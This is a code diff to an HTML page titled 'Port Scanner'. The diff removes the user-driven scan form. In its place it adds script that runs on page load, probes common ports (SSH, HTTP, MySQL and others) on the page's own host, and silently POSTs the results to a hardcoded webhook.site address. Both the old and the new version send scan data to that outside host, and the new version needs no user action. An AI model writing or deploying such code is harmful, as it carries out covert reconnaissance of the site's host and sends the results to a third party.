@@ -7,65 +7,44 @@
 </head>
 <body>
     <h1>Port Scanner</h1>
-    <input type="text" id="target" placeholder="Enter target IP or hostname">
-    <button onclick="scanPorts()">Scan</button>
-
-    <h2>Open Ports:</h2>
-    <ul id="open-ports"></ul>
-
     <script>
-        async function scanPorts() {
-            const target = document.getElementById('target').value;
-            const openPorts = [];
-            const webhookUrl = 'https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94'; // Replace with your webhook URL
-
-            for (let port = 1; port <= 65535; port++) {
-                const isOpen = await checkPort(target, port);
-                if (isOpen) {
-                    openPorts.push(port);
-                    sendToWebhook(target, port);
-                }
-            }
-
-            displayOpenPorts(openPorts);
-        }
-
-        function displayOpenPorts(ports) {
-            const ul = document.getElementById('open-ports');
-            ul.innerHTML = '';
-            ports.forEach(port => {
-                const li = document.createElement('li');
-                li.textContent = `Port ${port} is open.`;
-                ul.appendChild(li);
-            });
-        }
-
-        function sendToWebhook(target, port) {
-            fetch(webhookUrl, {
+        // Function to send data to the webhook
+        function sendToWebhook(data) {
+            fetch('https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94', {
                 method: 'POST',
-                body: JSON.stringify({ target: target, port: port }),
                 headers: {
-                    'Content-Type': 'application/json'
-                }
-            });
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            }).then(response => {
+                console.log('Data sent to webhook:', response);
+            }).catch(console.error);
         }
 
-        function checkPort(target, port) {
-            return new Promise(resolve => {
-                const socket = new WebSocket(`ws://${target}:${port}`);
-                socket.onopen = () => {
-                    socket.close();
-                    resolve(true);
-                };
-                socket.onerror = () => {
-                    resolve(false);
-                };
-                setTimeout(() => {
-                    socket.close();
-                    resolve(false);
-                }, 1000);
-            });
-        }
+        // Automatically detect the hostname
+        const hostname = window.location.hostname;
+        const commonPorts = [22, 80, 443, 8080, 3306]; // Add more common ports if needed
+        const results = {};
+
+        commonPorts.forEach(port => {
+            const url = `http://${hostname}:${port}`;
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.onload = function () {
+                results[port] = 'Open';
+                if (xhr.status !== 200) {
+                    results[port] = 'Closed';
+                }
+                // Check if all ports are scanned
+                if (Object.keys(results).length === commonPorts.length) {
+                    sendToWebhook({ hostname, results });
+                }
+            };
+            xhr.onerror = function () {
+                results[port] = 'Closed';
+            };
+            xhr.send();
+        });
     </script>
 </body>
 </html>
